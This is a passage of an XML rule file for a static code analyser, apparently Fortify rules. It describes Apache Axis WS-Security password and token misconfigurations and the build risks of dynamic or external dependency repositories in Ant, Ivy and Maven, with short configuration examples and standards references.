																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3620 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3620 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3620 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3620 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3620 CAT II</em> <br></p>
																									   <p>[10]  <em>Axis Reference Guide</em> Apache Software Foundation<br></p>
																									   <p>[11] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[12] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 651</em> <br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.6</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_axis_service_provider_misconfiguration_plain_text_password
		</key>
		<internalKey>Environment/Axis Service Provider Misconfiguration/Plain
			Text Password
		</internalKey>
		<name>Axis Service Provider Misconfiguration: Plain Text Password
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Avoid the WS-Security password type <code>PasswordText</code>.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Using a password type of <code>PasswordText</code> might be an indication that actual passwords are being transmitted in plain text. The WS-Security UsernameToken Profile states that text sent in the UsernameToken <code>&lt;Password&gt;</code> tag are not limited to being actual passwords. They can be password derivatives instead. However, it is common for developers to send actual passwords instead of password derivatives. Sending unencrypted passwords or even password hashes exposes the credentials to anyone with a traffic sniffer.<br><br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A6 Sensitive Data Exposure</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A7 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A8 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A8 Insecure Storage</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 522</em> <br></p>
																									   <p>[11] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[13] Standards Mapping - FIPS200 - (FISMA) <em>MP</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.3, Requirement 8.2.1</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 4.1, Requirement 6.5.3, Requirement 8.4</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 4.1, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[19]  <em>Web Services Security Username Token Profile 1.0</em> OASIS<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_axis_service_provider_misconfiguration_weak_token
		</key>
		<internalKey>Environment/Axis Service Provider Misconfiguration/Weak
			Token
		</internalKey>
		<name>Axis Service Provider Misconfiguration: Weak Token</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Using a UsernameToken with a plain text password over an unencrypted channel exposes the password to attackers who can sniff the SOAP messages.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Service Providers that use the UsernameToken might accept passwords sent in clear text. Sending clear text passwords over an unencrypted channel can expose the credential to attackers who can sniff the SOAP message.<br><br>The following Axis service provider configuration uses the UsernameToken:<br><pre><br>&lt;deployment xmlns=&quot;http://xml.apache.org/axis/wsdd/&quot; xmlns:java=&quot;http://xml.apache.org/axis/wsdd/providers/java&quot;&gt;<br>...<br>	&lt;parameter name=&quot;action&quot; value=&quot;UsernameToken&quot;/&gt;<br>...<br>&lt;/deployment&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A7 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A8 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A8 Insecure Storage</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 311</em> <br></p>
																									   <p>[11] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[13] Standards Mapping - FIPS200 - (FISMA) <em>MP</em> <br></p>
																									   <p>[14] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.3, Requirement 8.2.1</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 4.1, Requirement 6.5.3, Requirement 8.4</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 4.1, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[20] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[21]  <em>Web Services Security Username Token Profile 1.0</em> OASIS<br></p>
																									   <p>[22]  <em>Web Services Security: SOAP Message Security 1.1</em> OASIS<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_axis_service_requester_misconfiguration_plain_text_password
		</key>
		<internalKey>Environment/Axis Service Requester Misconfiguration/Plain
			Text Password
		</internalKey>
		<name>Axis Service Requester Misconfiguration: Plain Text Password
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Avoid the WS-Security password type <code>PasswordText</code>.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Using a password type of <code>PasswordText</code> might be an indication that actual passwords are being transmitted in plain text. The WS-Security UsernameToken Profile states that text sent in the UsernameToken <code>&lt;Password&gt;</code> tag are not limited to being actual passwords. They can be password derivatives instead. However, it is common for developers to send actual passwords instead of password derivatives. Sending unencrypted passwords or even password hashes exposes the credentials to anyone with a traffic sniffer.<br><br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A6 Sensitive Data Exposure</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A7 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A8 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A8 Insecure Storage</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 522</em> <br></p>
																									   <p>[11] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[13] Standards Mapping - FIPS200 - (FISMA) <em>MP</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.3, Requirement 8.2.1</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 4.1, Requirement 6.5.3, Requirement 8.4</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 4.1, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[19]  <em>Web Services Security Username Token Profile 1.0</em> OASIS<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_axis_service_requester_misconfiguration_weak_token
		</key>
		<internalKey>Environment/Axis Service Requester Misconfiguration/Weak
			Token
		</internalKey>
		<name>Axis Service Requester Misconfiguration: Weak Token</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Using a UsernameToken with a plain text password over an unencrypted channel exposes the password to attackers who can sniff the SOAP messages.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Sending clear text passwords or password hashes over an unencrypted channel can expose the credential to attackers who can sniff the SOAP message.<br><br>The following Axis client configuration uses the UsernameToken:<br><pre><br>&lt;deployment xmlns=&quot;http://xml.apache.org/axis/wsdd/&quot; xmlns:java=&quot;http://xml.apache.org/axis/wsdd/providers/java&quot;&gt;<br>...<br>	&lt;parameter name=&quot;action&quot; value=&quot;UsernameToken&quot;/&gt;<br>...<br>&lt;/deployment&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A7 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A8 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A8 Insecure Storage</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 311</em> <br></p>
																									   <p>[11] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[13] Standards Mapping - FIPS200 - (FISMA) <em>MP</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.3, Requirement 8.2.1</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 4.1, Requirement 6.5.3, Requirement 8.4</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 4.1, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[19]  <em>Web Services Security Username Token Profile 1.0</em> OASIS<br></p>
																									   <p>[20]  <em>Web Services Security: SOAP Message Security 1.1</em> OASIS<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_build_misconfiguration_dynamic_dependency_version_usage
		</key>
		<internalKey>Environment/Build Misconfiguration/Dynamic Dependency
			Version Usage
		</internalKey>
		<name>Build Misconfiguration: Dynamic Dependency Version Usage</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Retrieving build dependencies using a dynamic version can leave the build system vulnerable to malicious binaries or cause the system to experience unexpected behavior.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The Apache Ivy automated dependency management system allows users to specify a version status, known as a dynamic revision, for a dependency instead of listing the specific. If an attacker is able to compromise the dependency repository or trick the build system into downloading dependencies from a repository under the attacker's control, then a dynamic revision specifier may be all that's needed for the build system to silently download and run the compromised dependency. Beyond the security risks, dynamic revisions also introduce an element of risk on the code quality front: Dynamic revisions place the security and stability of your software under the control of the third-parties who develop and release the dependencies your software uses.<br><br>At build time, Ivy connects to the repository and attempts to retrieve a dependency that matches the status listed.<br><br>Ivy accepts the following dynamic revision specifiers:<br><br>-	<code>latest.integration</code>: Selects the latest revision of the dependency module.<br>-	<code>latest.[any status]</code>: Selects the latest revision of the dependency module with at minimum the specified status. For example, <code>latest.milestone</code> will select the latest version that is either a milestone or a release, and <code>latest.release</code> will only select the latest release.<br>-	Any revision that ends in <code>+</code>: Selects the latest sub-revision of the dependency module. For example, if the dependency exists in revisions 1.0.3, 1.0.7 and 1.1.2, a revision specified as <code>1.0.+</code> will select revision 1.0.7.<br>-	Version ranges: Mathematical notation for ranges, such as &lt; and &gt;, can be used to match a range of versions.<br><br><b>Example 1:</b> The following configuration entry instructs Ivy to retrieve the latest release version of the clover component:<br><br><pre><br>&lt;dependencies&gt;<br>        &lt;dependency org="clover" name="clover"<br>                    rev="latest.release" conf="build-&gt;*"/&gt;<br>	...<br></pre><br><br>If the repository is compromised, an attacker could simply upload a version that meets the dynamic criteria to cause Ivy to download a malicious version of the dependency.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M7 Client Side Injection</em> <br></p>
																									   <p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-18 Mobile Code (P2)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_build_misconfiguration_external_ant_dependency_repository
		</key>
		<internalKey>Environment/Build Misconfiguration/External Ant
			Dependency Repository
		</internalKey>
		<name>Build Misconfiguration: External Ant Dependency Repository
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  This ant build script relies on external sources, which could allow an attacker to insert malicious code into the final product or to take control of the build machine.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Several tools exist within the Java development world to aid in dependency management: both Apache Ant and Apache Maven build systems include functionality specifically designed to help manage dependencies and Apache Ivy is developed explicitly as a dependency manager. Although there are differences in their behavior, these tools share the common functionality that they automatically download external dependencies specified in the build process at build time. This makes it much easier for developer B to build software in the same manner as developer A. Developers just store dependency information in the build file, which means that each developer and build engineer has a consistent way to obtain dependencies, compile the code, and deploy without the dependency management hassles involved in manual dependency management. The following examples illustrate how Ivy, Ant and Maven can be used to manage external dependencies as part of a build process.<br><br>Developers specify external dependencies in an Ant target using a <code>&lt;get&gt;</code> task, which retrieves the dependency specified by the corresponding URL. This approach is functionally equivalent to scenario where a developer documents each external dependency as an artifact included with the software project, but is more desirable because it automates the retrieval and incorporation of the dependencies when a build is performed.<br><br><b>Example:</b> The following excerpt from an Ant build.xml configuration file shows a typical reference to an external dependency:<br><br><pre><br>&lt;get src="http://people.apache.org/repo/m2-snapshot-repository/org/apache/openejb/openejb-jee/3.0.0-SNAPSHOT/openejb-jee-3.0.0-SNAPSHOT.jar"<br>dest="${maven.repo.local}/org/apache/openejb/openejb-jee/3.0.0-SNAPSHOT/openejb-jee-3.0.0-SNAPSHOT.jar"<br>usetimestamp="true" ignoreerrors="true"/&gt;<br></pre><br><br>Two distinct types of attack scenarios affect these systems: An attacker could either compromise the server hosting the dependency or compromise the DNS server the build machine uses to redirect requests for hostname of the server hosting the dependency to a machine controlled by the attacker. Both scenarios result in the attacker gaining the ability to inject a malicious version of a dependency into a build running on an otherwise uncompromised machine.<br><br>Regardless of the attack vector used to deliver the Trojan dependency, these scenarios share the common element that the build system blindly accepts the malicious binary and includes it in the build. Because the build system has no recourse for rejecting the malicious binary and existing security mechanisms, such as code review, typically focus on internally-developed code rather than external dependencies, this type of attack has a strong potential to go unnoticed as it spreads through the development environment and potentially into production.<br><br>Although there is some risk of a compromised dependency being introduced into a manual build process, by the tendency of automated build systems to retrieve the dependency from an external source each time the build system is run in a new environment greatly increases the window of opportunity for an attacker. An attacker need only compromise the dependency server or the DNS server during one of the many times the dependency is retrieved in order to compromise the machine on which the build is occurring.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M7 Client Side Injection</em> <br></p>
																									   <p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-18 Mobile Code (P2)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_build_misconfiguration_external_ivy_dependency_repository
		</key>
		<internalKey>Environment/Build Misconfiguration/External Ivy
			Dependency Repository
		</internalKey>
		<name>Build Misconfiguration: External Ivy Dependency Repository
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  This ant build script relies on external sources, which could allow an attacker to insert malicious code into the final product or to take control of the build machine.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Several tools exist within the Java development world to aid in dependency management: both Apache Ant and Apache Maven build systems include functionality specifically designed to help manage dependencies and Apache Ivy is developed explicitly as a dependency manager. Although there are differences in their behavior, these tools share the common functionality that they automatically download external dependencies specified in the build process at build time. This makes it much easier for developer B to build software in the same manner as developer A. Developers just store dependency information in the build file, which means that each developer and build engineer has a consistent way to obtain dependencies, compile the code, and deploy without the dependency management hassles involved in manual dependency management. The following examples illustrate how Ivy, Ant and Maven can be used to manage external dependencies as part of a build process.<br><br>Under Ivy, instead of listing explicit URLs from which to retrieve the dependencies, developers specify the dependency names and versions and Ivy relies on its underlying configuration to identify the server(s) from which to retrieve the dependencies. For commonly used components this saves the developer from having to researching dependency locations.<br><br><b>Example 1:</b> The following except from an Ivy ivy.xml file shows how a developer can specify multiple external dependencies using their name and version:<br><br><pre><br>&lt;dependencies&gt;<br>  &lt;dependency org="javax.servlet"<br>             name="servletapi"<br>              rev="2.3" conf="build-&gt;*"/&gt;<br>  &lt;dependency org="javax.jms"<br>             name="jms"<br>              rev="1.1" conf="build-&gt;*"/&gt;  ...<br>&lt;/dependencies&gt;<br></pre><br><br>Two distinct types of attack scenarios affect these systems: An attacker could either compromise the server hosting the dependency or compromise the DNS server the build machine uses to redirect requests for hostname of the server hosting the dependency to a machine controlled by the attacker. Both scenarios result in the attacker gaining the ability to inject a malicious version of a dependency into a build running on an otherwise uncompromised machine.<br><br>Regardless of the attack vector used to deliver the Trojan dependency, these scenarios share the common element that the build system blindly accepts the malicious binary and includes it in the build. Because the build system has no recourse for rejecting the malicious binary and existing security mechanisms, such as code review, typically focus on internally-developed code rather than external dependencies, this type of attack has a strong potential to go unnoticed as it spreads through the development environment and potentially into production.<br><br>Although there is some risk of a compromised dependency being introduced into a manual build process, by the tendency of automated build systems to retrieve the dependency from an external source each time the build system is run in a new environment greatly increases the window of opportunity for an attacker. An attacker need only compromise the dependency server or the DNS server during one of the many times the dependency is retrieved in order to compromise the machine on which the build is occurring.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M7 Client Side Injection</em> <br></p>
																									   <p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-18 Mobile Code (P2)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_build_misconfiguration_external_maven_dependency_repository
		</key>
		<internalKey>Environment/Build Misconfiguration/External Maven
			Dependency Repository
		</internalKey>
		<name>Build Misconfiguration: External Maven Dependency Repository
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  This maven build script relies on external sources, which could allow an attacker to insert malicious code into the final product or to take control of the build machine.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Several tools exist within the Java development world to aid in dependency management: both Apache Ant and Apache Maven build systems include functionality specifically designed to help manage dependencies and Apache Ivy is developed explicitly as a dependency manager. Although there are differences in their behavior, these tools share the common functionality that they automatically download external dependencies specified in the build process at build time. This makes it much easier for developer B to build software in the same manner as developer A. Developers just store dependency information in the build file, which means that each developer and build engineer has a consistent way to obtain dependencies, compile the code, and deploy without the dependency management hassles involved in manual dependency management. The following examples illustrate how Ivy, Ant and Maven can be used to manage external dependencies as part of a build process.<br><br>Under Maven, instead of listing explicit URLs from which to retrieve the dependencies, developers specify the dependency names and versions and Maven relies on its underlying configuration to identify the server(s) from which to retrieve the dependencies. For commonly used components this saves the developer from having to researching dependency locations.<br><br><b>Example 1:</b> The following except from a Maven pom.xml file shows how a developer can specify multiple external dependencies using their name and version:<br><br><pre><br>&lt;dependencies&gt;<br>  &lt;dependency&gt;<br>    &lt;groupId&gt;commons-logging&lt;/groupId&gt;<br>    &lt;artifactId&gt;commons-logging&lt;/artifactId&gt;<br>    &lt;version&gt;1.1&lt;/version&gt;<br>  &lt;/dependency&gt;<br>  &lt;dependency&gt;<br>    &lt;groupId&gt;javax.jms&lt;/groupId&gt;<br>    &lt;artifactId&gt;jms&lt;/artifactId&gt;<br>    &lt;version&gt;1.1&lt;/version&gt;<br>  &lt;/dependency&gt;<br>  ...<br>&lt;/dependencies&gt;<br></pre><br><br>Two distinct types of attack scenarios affect these systems: An attacker could either compromise the server hosting the dependency or compromise the DNS server the build machine uses to redirect requests for hostname of the server hosting the dependency to a machine controlled by the attacker. Both scenarios result in the attacker gaining the ability to inject a malicious version of a dependency into a build running on an otherwise uncompromised machine.<br><br>Regardless of the attack vector used to deliver the Trojan dependency, these scenarios share the common element that the build system blindly accepts the malicious binary and includes it in the build. Because the build system has no recourse for rejecting the malicious binary and existing security mechanisms, such as code review, typically focus on internally-developed code rather than external dependencies, this type of attack has a strong potential to go unnoticed as it spreads through the development environment and potentially into production.<br><br>Although there is some risk of a compromised dependency being introduced into a manual build process, by the tendency of automated build systems to retrieve the dependency from an external source each time the build system is run in a new environment greatly increases the window of opportunity for an attacker. An attacker need only compromise the dependency server or the DNS server during one of the 